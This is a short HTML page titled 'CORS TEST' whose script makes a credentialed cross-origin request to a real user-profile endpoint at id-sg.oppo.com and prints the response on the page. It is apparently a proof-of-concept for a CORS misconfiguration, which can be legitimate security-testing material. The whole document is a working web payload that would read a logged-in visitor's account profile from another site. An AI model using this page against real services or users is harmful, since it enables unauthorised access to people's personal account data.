<!DOCTYPE html>
<html>
<body>
<h2>CORS TEST</h2>
<pre id="result">Waiting...</pre>

<script>
fetch("https://id-sg.oppo.com/v3/user-center/profile", {
  method: "GET",
  credentials: "include"
})
.then(r => r.text())
.then(data => {
  document.getElementById("result").innerText = data;
})
.catch(e => {
  document.getElementById("result").innerText = e;
});
</script>
</body>
</html>
